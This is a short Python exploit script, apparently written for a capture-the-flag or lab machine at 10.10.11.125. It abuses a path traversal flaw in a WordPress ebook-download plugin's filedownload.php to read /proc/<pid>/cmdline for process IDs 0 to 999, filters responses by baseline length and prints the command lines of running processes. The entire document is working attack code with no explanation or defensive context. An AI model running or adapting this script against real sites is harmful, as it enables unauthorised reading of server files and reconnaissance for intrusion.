import requests

start = 0; end = 1000

def get_length() -> list:
	nums = []
	for num in [0,10,100,1000]:
		url = f"http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/{num}/cmdline"
		nums.append(len(requests.get(url).text))
	return nums

lengths = get_length()
for pid in range(start,end,1):
	url = f"http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/{pid}/cmdline"
	r = requests.get(url).text
	if len(r) not in lengths:
		print(r)
